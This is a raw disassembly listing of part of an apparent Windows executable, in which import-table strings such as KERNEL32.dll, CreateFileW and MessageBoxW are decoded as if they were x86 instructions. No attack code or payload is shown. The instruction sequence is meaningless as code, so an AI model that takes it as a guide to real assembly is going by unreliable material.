  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
